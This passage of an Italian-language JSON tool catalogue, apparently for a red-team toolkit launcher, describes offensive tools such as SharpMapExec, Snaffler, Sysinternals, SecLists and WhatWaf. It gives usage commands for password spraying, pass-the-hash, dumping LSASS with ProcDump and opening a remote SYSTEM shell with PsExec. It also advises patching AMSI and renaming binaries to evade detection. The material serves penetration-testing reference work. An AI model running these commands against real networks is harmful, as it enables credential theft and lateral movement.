    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpMapExec è una riscrittura in C# del popolare CrackMapExec (CME). Nasce per offrire le stesse capacità di network sweeping e lateral movement in un formato eseguibile nativo (.NET assembly), ideale per essere eseguito via Cobalt Strike `execute-assembly` o altri C2 framework, bypassando la necessità di proxyare traffico o installare Python/dipendenze sul target compromesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living off the Land:</strong> Sfrutta le librerie native di Windows per le comunicazioni di rete, riducendo le dipendenze esterne. Esegue autenticazioni NTLM/Kerberos per validare credenziali su ampi range di IP.</p><p><strong>Esecuzione Comandi:</strong> Supporta diverse strategie di esecuzione remota (WMI, SMB, WinRM) per lanciare payload o comandi di ricognizione su host multipli contemporaneamente.</p><p><strong>Enumerazione:</strong> Raccoglie informazioni vitali come share accessibili, sessioni utente attive, drive mappati e gruppi locali amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi cerca di specchiare quella di CME per facilitare la transizione.</p><pre><code># Password Spraying su subnet\nSharpMapExec.exe smb /targets:192.168.1.0/24 /user:admin /password:pass\n\n# Pass-the-Hash e check privilegi admin\nSharpMapExec.exe wmi /targets:servers.txt /user:admin /ntlm:hash /check\n\n# Esecuzione comando su target multipli\nSharpMapExec.exe winrm /targets:10.0.0.50 /user:user /pass:pass /exec:\"ipconfig /all\"</code></pre><p>Gli argomenti possono essere abbreviati e il tool gestisce output colorato per evidenziare successi (Pwn3d!).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per il <strong>Lateral Movement</strong> in scenari dove si opera da un beacon in memoria e non si può usare SOCKS proxy. Permette di \"pivotare\" rapidamente testando le credenziali dumpate contro altri host della rete interna direttamente dalla memoria del processo compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Soffre degli stessi problemi di CME: genera picchi di log di autenticazione. Inoltre, essendo un binario .NET non firmato, è soggetto a scansione AMSI al caricamento.</p><p><strong>Mitigazioni:</strong> Usare tramite `execute-assembly` dopo aver disabilitato/patchato AMSI. Evitare scansioni massive; preferire target list mirate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sharpview",
    "name": "SharpView.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tevora-threat/SharpView",
    "desc": "Porting .NET di PowerView: enumerazione Active Directory stealth eseguibile via C# per bypassare restrizioni PowerShell.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpView è la reimplementazione in C# del leggendario PowerView. È stato creato per operare in ambienti dove PowerShell è monitorato (Script Block Logging) o limitato (Constrained Language Mode). Offre le stesse funzioni di ricognizione AD (User hunting, Group enum, Trust mapping) ma in un formato binario compilato, ideale per l'esecuzione \"in-memory\" tramite Cobalt Strike o altri C2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>API Parity:</strong> Implementa quasi tutti i cmdlet di PowerView (<code>Get-DomainUser</code>, <code>Invoke-ShareFinder</code>, ecc.) mantenendo la stessa sintassi degli argomenti.</p><p><strong>Bypass AMSI:</strong> Essendo .NET assembly, è più facile da caricare eludendo le firme AMSI rispetto agli script .ps1 grezzi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire come normale binario o via assembly loader.</p><pre><code># Enumerazione utenti con dettagli\nSharpView.exe Get-DomainUser -Properties samaccountname,description\n\n# Ricerca admin locali\nSharpView.exe Find-LocalAdminAccess</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Evasion & Recon:</strong> Quando <code>powershell.exe</code> è bloccato o allarma il SOC, SharpView permette di continuare la ricognizione situazionale del dominio utilizzando processi legittimi per caricare il codice .NET.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene eviti PS, genera comunque traffico LDAP/RPC verso il DC analizzabile da Defender for Identity. Il binario su disco è firmato come hacktool.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "snaffler",
    "name": "Snaffler.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SnaffCon/Snaffler",
    "desc": "Scanner avanzato per share SMB che identifica file sensibili (password, chiavi SSH, config) tramite pattern matching e regex.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Snaffler è uno strumento di \"caccia al tesoro\" automatizzata per ambienti Active Directory. Scansiona le share di rete accessibili (SYSVOL, netlogon, file server) alla ricerca di dati sensibili che gli amministratori o gli utenti hanno lasciato incustoditi. Utilizza un motore di regole sofisticato per distinguere tra file spazzatura e vere credenziali, chiavi private, backup di database o file di configurazione con password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Intelligente:</strong> Non si limita a cercare nomi di file. Ispeziona il contenuto dei file (fino a una certa dimensione) cercando pattern regex di credenziali, stringhe di connessione SQL, token API e altro.</p><p><strong>Riduzione Rumore:</strong> Il suo punto di forza è la capacità di scartare falsi positivi (es. file .xml di esempio) e classificare i ritrovamenti per livello di gravità (Nero, Rosso, Giallo, Verde), permettendo al pentester di focalizzarsi solo sui dati critici.</p><p><strong>Velocità:</strong> Fortemente multithreaded, può processare terabyte di dati distribuiti su centinaia di share in tempi ridotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di essere eseguito da un utente di dominio. L'output a video è molto verboso, quindi è essenziale loggare su file.</p><pre><code># Scansione standard (molto rumorosa a video)\nSnaffler.exe -s -o risultati.log\n\n# Scansione mirata su computer specifici con output dettagliato\nSnaffler.exe -n -i computers.txt -o snaffler.log -v data\n\n# Analisi dei risultati (live triage)\nGet-Content snaffler.log -Wait | Select-String \"^(\\{Black\\}|\\{Red\\})\"</code></pre><p>Le tag <code>{Black}</code> indicano ritrovamenti critici certi (es. file id_rsa senza password), <code>{Red}</code> alta probabilità di credenziali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, spesso fornisce la chiave per il dominio (es. un file <code>web.config</code> con password di sa o un backup di AD). In fase di <strong>Audit/Cleanup</strong>, aiuta le aziende a identificare e rimuovere dati sensibili esposti a tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un traffico SMB di lettura massivo. Può saturare la banda se non limitato. I sistemi DLP o di monitoraggio file server noteranno l'accesso a migliaia di file in breve tempo.</p><p><strong>Impatto operativo:</strong> Alto consumo di IOPS sui file server.</p><p><strong>Mitigazioni:</strong> Eseguire in orari non lavorativi. Usare opzioni per limitare il numero di thread o escludere share molto grandi/sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "sysinternals-suite",
    "name": "SysinternalsSuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite",
    "desc": "Suite ufficiale Microsoft di utility avanzate per troubleshooting, analisi processi, forensics e gestione remota (PsExec, ProcMon, Sysmon).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La Sysinternals Suite è una collezione di oltre 70 utility di sistema create da Mark Russinovich (Microsoft). Sebbene nate per amministrazione e debugging, sono armi a doppio taglio fondamentali sia per attaccanti (per movimento laterale, persistenza e evasione) che per difensori (per analisi forense, monitoraggio e rilevamento malware). Essendo firmate digitalmente da Microsoft, spesso bypassano controlli di whitelisting basilari.</p><br><hr><h4 class=\"rt-purple\">Tool Chiave per Security</h4><p><strong>PsExec:</strong> Lo standard per l'esecuzione remota. Permette di lanciare processi su altri sistemi (via SMB/RPC) con privilegi SYSTEM, usato massivamente per lateral movement.</p><p><strong>ProcDump:</strong> Utility da riga di comando per il monitoraggio dei crash, abusata dagli attaccanti per eseguire il dump della memoria del processo LSASS (<code>lsass.exe</code>) e estrarre credenziali senza usare Mimikatz, spesso evadendo gli AV.</p><p><strong>Sysmon:</strong> Strumento difensivo che installa un driver per loggare attività dettagliate di sistema (creazione processi, connessioni di rete, modifica file) nel registro eventi, essenziale per il threat hunting moderno.</p><p><strong>Autoruns & ProcMon:</strong> Fondamentali per analisi forense statica e dinamica, permettono di individuare meccanismi di persistenza (chiavi di registro, servizi, task) e tracciare l'attività real-time di malware.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La suite è composta da eseguibili standalone portabili.</p><pre><code># PsExec: Shell interattiva remota come SYSTEM\npsexec.exe \\\\192.168.1.50 -u Administrator -p Pass -s cmd.exe\n\n# ProcDump: Dump memoria LSASS (richiede Admin)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Sysmon: Installazione con configurazione xml\nsysmon.exe -accepteula -i config.xml</code></pre><p>È possibile usare la versione live web senza download tramite il path UNC: <code>\\\\live.sysinternals.com\\tools\\toolname.exe</code> (se l'accesso internet è permesso).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, PsExec è il metodo classico per spostarsi dopo aver ottenuto credenziali admin. ProcDump è la tecnica \"Living off the Land\" preferita per il credential harvesting. In <strong>Incident Response</strong>, Process Explorer e Autoruns sono i primi tool lanciati su una macchina sospetta per identificare processi anomali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PsExec lascia tracce evidenti (servizio PSEXESVC, Event ID 7045). ProcDump su LSASS è una firma nota per gli EDR. L'uso di <code>live.sysinternals.com</code> genera traffico WebDAV sospetto in uscita.</p><p><strong>Mitigazioni:</strong> Rinominare gli eseguibili (es. <code>pd.exe</code> per ProcDump). Usare varianti di PsExec (come quello di Impacket o CS) che offrono più controllo. Non eseguire mai tool direttamente dal web server Microsoft in un engagement stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "wordlist-paroleitaliane",
    "name": "Parole Italiane",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/napolux/paroleitaliane",
    "desc": "Collezione di wordlist mirate per l'Italia: nomi, cognomi, città e termini comuni per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa risorsa è una raccolta di dizionari ottimizzati per target italiani. A differenza di wordlist internazionali come RockYou, contiene termini culturalmente specifici (squadre di calcio, nomi di città, mesi in italiano, nomi propri diffusi) che compongono la maggior parte delle password aziendali in Italia. Essenziale per aumentare il tasso di successo nel cracking e nello spraying.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Liste Nomi/Cognomi:</strong> Fondamentali per generare liste di username aziendali (es. <code>m.rossi</code>) o per attacchi a dizionario ibridi.</p><p><strong>Pattern Comuni:</strong> Include parole base che, combinate con regole di mutazione (aggiunta di anno e punto esclamativo), coprono una vasta percentuale di password utente (es. \"Napoli2023!\").</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come input per tool di cracking.</p><pre><code># Generazione username con regole\nusername-anarchy -i nomi.txt cognomi.txt > userlist.txt\n\n# Cracking Hashcat con regole best64\nhashcat -m 1000 hash.txt parole_italiane.txt -r rules/best64.rule</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Teaming Italia:</strong> Inutile usare dizionari inglesi contro un'azienda di PA italiana. L'uso di queste liste riduce il tempo di cracking e aumenta i successi nello spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Mantenere le liste aggiornate con termini recenti (es. vincitori scudetto, eventi correnti).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-payloadsallthethings-4-2",
    "name": "PayloadsAllTheThings",
    "version": "4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/swisskyrepo/PayloadsAllTheThings",
    "desc": "Repository enciclopedico di payload, bypass, cheat sheet e guide per exploitation web, privilege escalation e metodologie di pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PayloadsAllTheThings non è un singolo eseguibile, ma una risorsa di conoscenza strutturata essenziale per ogni pentester. È un repository che aggrega le tecniche più efficaci, payload di fuzzing, one-liners per reverse shell e guide passo-passo per sfruttare vulnerabilità specifiche (SQLi, XSS, XXE, SSRF, ecc.). Serve come riferimento rapido durante le operazioni per adattare gli attacchi al contesto specifico.</p><br><hr><h4 class=\"rt-purple\">Contenuti principali</h4><p><strong>Web Exploitation:</strong> Liste esaustive di payload per bypassare filtri WAF in attacchi SQL Injection, XSS poliglotti, RCE e Template Injection. Include tecniche per scenari complessi come la deserializzazione insicura in vari linguaggi.</p><p><strong>Methodology & Cheat Sheets:</strong> Guide concise per fasi specifiche: \"Linux Privilege Escalation\", \"Active Directory Methodology\", \"Cloud Hacking\" (AWS, Azure). Offre comandi pronti all'uso per enumerazione ed exploit.</p><p><strong>Intruder Payloads:</strong> Wordlist ottimizzate per l'uso con Burp Suite Intruder, pensate per fuzzare parametri specifici e provocare errori o comportamenti anomali nelle applicazioni target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Questa risorsa si consulta principalmente via browser o clonando la repo localmente per grep rapidi.</p><pre><code># Clonazione per uso offline\ngit clone https://github.com/swisskyrepo/PayloadsAllTheThings.git\n\n# Ricerca rapida di una reverse shell Python\ngrep -r \"python\" PayloadsAllTheThings/Methodology\\ and\\ Resources/Reverse\\ Shell\\ Cheatsheet.md</code></pre><p>I payload vanno copiati e adattati manualmente (es. cambiando IP/Porta o encoding) prima dell'iniezione nel target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando un exploit standard fallisce a causa di un filtro o di una configurazione particolare, PATT fornisce varianti alternative (es. encoding diversi, metodi di concatenazione stringhe) per tentare il bypass. È la risorsa primaria per costruire <strong>fuzzing list customizzate</strong> durante il testing di applicazioni web robuste.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'uso cieco di payload presi da repository pubblici può essere pericoloso (es. payload che fanno crashare il servizio invece di testarlo) o inefficace. Comprendere sempre cosa fa il codice prima di iniettarlo, specialmente in ambienti di produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-portswigger",
    "name": "PortSwigger",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PortSwigger/wordlist-extractor",
    "desc": "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri e integration con Intruder/Extender",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong> è una collezione di utility e dizionari integrati nell'ecosistema Burp Suite. Include tool per estrarre/generare wordlist da asset dell'applicazione target e alimentarli direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response bodies di richieste Burp</li><li>File JavaScript e source maps</li><li>Commenti HTML e metadata</li><li>API responses e strutture JSON</li></ul><p><strong>Built-in wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password comuni</li><li>Directory e filename</li><li>Fuzzing parametri</li><li>Estensioni di file backup</li></ul><br><hr><h4 class=\"rt-green\">Integration Workflow</h4><p><strong>1. Estrazione context-aware:</strong> Durante il proxy browsing, catturare richieste e usare wordlist extractor per generare dizionari basati sulle naming conventions osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom in Burp Intruder payload sets per fuzzing mirato di directory, parametri, header.</p><p><strong>3. Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension per enumerazione di endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'Uso</h4><p><strong>API testing:</strong> Estrarre pattern di endpoint da documentazione Swagger/OpenAPI catturata nel proxy.</p><p><strong>Parameter discovery:</strong> Generare lista parametri da analisi JavaScript per parameter pollution testing.</p><p><strong>Backup file hunting:</strong> Creare wordlist con estensioni e suffissi comuni (.bak, .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa. Usare payload processing rules in Intruder per encoding/encryption on-the-fly. Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder extension per high-speed fuzzing su wordlist grandi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-seclists-2025-2",
    "name": "SecLists",
    "version": "2025.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/danielmiessler/SecLists",
    "desc": "La collezione standard de-facto di wordlist per discovery, fuzzing e brute-force: username, password, URL, file sensibili e pattern payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SecLists è l'archivio definitivo di liste utilizzate dai security tester. Raccoglie dizionari di password reali (es. RockYou), elenchi di username comuni, percorsi di file e directory per web discovery (es. raft, dirb), payload per fuzzing (XSS, SQLi) e molto altro. È la \"munizione\" per qualsiasi tool di brute-force o discovery automatico come Gobuster, wfuzz, Hydra o Burp Suite.</p><br><hr><h4 class=\"rt-purple\">Categorie principali</h4><p><strong>Discovery:</strong> Liste per enumerazione DNS (sottodomini), Web-Content (directory, file backup, admin panel), e parametri API. Include liste specifiche per tecnologie (CMS, IIS, Apache).</p><p><strong>Passwords & Usernames:</strong> Aggregazioni di leak storici, default credentials per dispositivi/software, e pattern comuni di username per password spraying.</p><p><strong>Fuzzing:</strong> Stringhe progettate per provocare crash o errori in applicazioni (buffer overflow patterns, format strings, caratteri speciali, LFI traversal).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SecLists viene usato come input per altri tool. Solitamente risiede in <code>/usr/share/seclists</code> su Kali/Parrot.</p><pre><code># Web Directory Brute-forcing con Gobuster\ngobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Password Spraying con Hydra\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P password123 ssh://192.168.1.1\n\n# Fuzzing API con Wfuzz\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://api.target/FUZZ</code></pre><p>Selezionare la lista giusta per dimensione e contesto è cruciale per il successo e la velocità dell'attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ogni fase del pentest: dalla <strong>Recon</strong> (trovare sottodomini nascosti) all'<strong>Exploitation</strong> (indovinare credenziali admin o path di file vulnerabili). È essenziale per scoprire risorse non linkate (\"Security by Obscurity\").</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di wordlist grandi genera migliaia di richieste in breve tempo (404 Not Found, 401 Unauthorized), facendo scattare immediatamente WAF, IPS e meccanismi di ban IP.</p><p><strong>Mitigazioni:</strong> Usare liste \"short\" o mirate prima di quelle massiva. Regolare il rate-limit dei tool utilizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "subbrute-77",
    "name": "subbrute-77",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/TheRook/subbrute",
    "desc": "Variante del tool SubBrute per enumerazione sottodomini tramite DNS ricorsivo aperto, utile per bypassare rate-limit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SubBrute è uno strumento di enumerazione sottodomini che si distingue per l'uso di una catena di resolver DNS aperti come proxy. Invece di inviare richieste direttamente dal proprio IP al nameserver autoritativo del target, SubBrute fa rimbalzare le query attraverso resolver pubblici vulnerabili/aperti. Questo non solo maschera l'origine dell'attacco, ma permette di aggirare i rate-limit imposti dal target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Resolver Chain:</strong> Utilizza una lista di resolver aperti per distribuire il carico delle query.</p><p><strong>Recursive Crawling:</strong> Capace di enumerare record DNS ricorsivamente per trovare sottodomini profondi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Enumerazione con wordlist default\npython subbrute.py target.com\n\n# Uso lista resolver custom\npython subbrute.py -r resolvers.txt target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon Stealth:</strong> Quando si vuole mappare l'infrastruttura esterna senza bruciare il proprio IP o essere bloccati per troppe richieste DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il target vede traffico DNS provenire da molti IP diversi (i resolver), rendendo difficile il blocco basato su IP sorgente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "01_Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maurosoria/dirsearch",
    "desc": "Fuzzer web multi-thread veloce per discovery di directory, file nascosti e backup, con wordlist intelligenti e filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dirsearch è uno standard de facto per il web path bruteforcing scritto in Python. È progettato per la velocità e la facilità d'uso, permettendo di scoprire risorse nascoste (admin panel, file .git, backup .bak) su server web. Supporta il fuzzing ricorsivo, estensioni multiple e tecniche di evasione per ridurre i falsi positivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> Gestisce thread multipli e keep-alive connection per massimizzare il throughput di richieste al secondo.</p><p><strong>Smart Detection:</strong> Rileva automaticamente pagine di \"Not Found\" customizzate e filtra le risposte in base a dimensione, status code o contenuto, riducendo il rumore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Comando base per scansione con estensioni comuni.</p><pre><code># Scansione base con estensioni php,html,txt\npython3 dirsearch.py -u https://target.com -e php,html,txt\n\n# Scansione con wordlist custom e delay per stealth\npython3 dirsearch.py -u https://target.com -w /path/wordlist.txt -e * --delay 0.5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato in ogni <strong>Web Assessment</strong> dopo la ricognizione iniziale. Trovare un file <code>db_backup.sql.zip</code> o una cartella <code>/.git/</code> dimenticata dagli sviluppatori offre spesso un percorso diretto alla compromissione senza bisogno di exploit complessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di errori 404. Estremamente rumoroso. WAF e meccanismi di ban IP (Fail2Ban) interverranno quasi subito se non configurato con rate-limit basso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "01_Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "aquatone-linux-amd64",
    "name": "aquatone_linux_amd64",
    "version": "1.7.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/michenriksen/aquatone",
    "desc": "Tool di ricognizione visiva che esegue screenshot automatici di domini multipli e clusterizza i risultati per rapida revisione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aquatone è uno strumento essenziale per la ricognizione web su larga scala. Quando si ha a che fare con centinaia di sottodomini, visitarli manualmente è impossibile. Aquatone utilizza browser headless (Chromium/Puppeteer) per visitare automaticamente ogni target, catturare uno screenshot, e raccogliere gli header di risposta. La sua potenza sta nel generare un report HTML visuale che raggruppa le pagine simili, permettendo all'analista di individuare a colpo d'occhio superfici d'attacco interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual Clustering:</strong> Analizza la struttura HTML e gli screenshot per raggruppare pagine identiche (es. pagine di default di IIS o Apache). Questo riduce il rumore, permettendo di ignorare centinaia di siti inutili e concentrarsi sulle deviazioni.</p><p><strong>Port Scanning Integration:</strong> Può importare direttamente output di Nmap o Masscan, o eseguire una scansione rapida delle porte web comuni (80, 443, 8000, 8080) prima di tentare lo screenshot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accetta input via pipe standard (es. lista di domini o URL).</p><pre><code># Pipeline tipica: Discovery -> Aquatone\ncat subdomains.txt | ./aquatone_linux_amd64 -ports large -out ./report</code></pre><p>Al termine, aprire il file <code>aquatone_report.html</code> nel browser per navigare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>External Infrastructure Assessment</strong>, Aquatone trasforma una lista di 5000 IP in una galleria navigabile, evidenziando immediatamente pannelli di login esposti, directory listing aperti o errori applicativi che espongono versioni software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP standard, ma con pattern riconoscibili se non si personalizza lo User-Agent. Navigare migliaia di URL in breve tempo può far scattare blocchi IP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "01_Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "whatwaf-1-9",
    "name": "WhatWaf",
    "version": "1.9",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ekultek/WhatWaf",
    "desc": "Tool di detection avanzata per Web Application Firewall (WAF) che suggerisce tecniche di bypass e tamper payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WhatWaf rileva la presenza di firewall web analizzando le risposte a payload malevoli e confrontandole con firme note. La sua caratteristica distintiva è la capacità di suggerire script di \"tampering\" (modifica del payload) per tentare di aggirare le protezioni identificate, sfruttando encoding o tecniche di offuscamento specifiche per quel vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Fingerprinting:</strong> Riconosce oltre 70 WAF diversi (Cloudflare, AWS, Imperva, ModSecurity) tramite analisi header e comportamenti di blocco.</p><p><strong>Bypass Suggestions:</strong> Tenta di inviare payload modificati (es. URL encoding, case variation) per vedere se il WAF li lascia passare, indicando quali tecniche funzionano.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Analisi target\n./whatwaf -u https://target.com\n\n# Tentativo bypass attivo con payload XSS\n./whatwaf -u https://target.com --pl \"<script>alert(1)</script>\" --ra</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Assessment:</strong> Prima di lanciare scanner pesanti, capire quale WAF protegge il sito permette di configurare gli scanner con i giusti delay o script di evasione per non essere bannati subito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Invia payload di attacco evidenti. Il WAF sicuramente loggerà e bloccherà i tentativi iniziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "01_Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "paramspider",
    "name": "paramspider",
    "version": "1.0.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/devanshbatham/ParamSpider",
    "desc": "Tool di ricognizione passiva che estrae parametri URL da archivi web (Wayback Machine) per scoprire vulnerabilità nascoste.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ParamSpider è uno strumento di ricognizione focalizzato sulla scoperta di parametri URL potenzialmente vulnerabili senza interagire direttamente con il target (passive recon). Interroga enormi archivi storici come la Wayback Machine e Common Crawl per recuperare vecchi URL associati al dominio bersaglio. Questo permette di identificare parametri \"dimenticati\" (es. <code>?debug=true</code>, <code>?admin_token=</code>) che sono vettori ideali per XSS, SQL Injection o SSRF, spesso sfuggiti ai crawler attivi moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mining da Archivi Web:</strong> Non esegue crawling attivo, ma estrae milioni di URL storici dagli archivi pubblici. Questo approccio è invisibile ai sistemi di difesa del target (WAF/SIEM) e rivela endpoint dismessi ma ancora attivi.</p><p><strong>Parameter Cleaning:</strong> Include algoritmi per pulire i risultati, rimuovendo duplicati e URL \"spazzatura\" (es. immagini .jpg, .css) per fornire una lista pulita di parametri testabili (fuzzing ready).</p><p><strong>Supporto Nested Parameters:</strong> Capace di identificare strutture complesse di URL e parametri annidati, spesso usati in applicazioni enterprise legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3. L'output viene salvato automaticamente in un file txt.</p><pre><code># Scansione base di un dominio\npython3 paramspider.py -d target.com\n\n# Scansione con esclusione di estensioni e output custom\npython3 paramspider.py -d target.com --exclude php,aspx --output params.txt --level high</code></pre><p>I risultati sono formattati per essere passati direttamente a tool di fuzzing come GF (Grep Fuzz) o Nuclei.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Fondamentale nel <strong>Bug Bounty Hunting</strong> su target molto grandi o \"hardenizzati\". Quando la homepage è sicura, ParamSpider trova quella vecchia pagina di marketing del 2018 con un parametro <code>?redirect=</code> vulnerabile a Open Redirect o XSS. In <strong>Web Application Assessment</strong>, aiuta a mappare la superficie d'attacco storica che non è linkata nell'applicazione attuale.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Zero traffico verso il target durante la 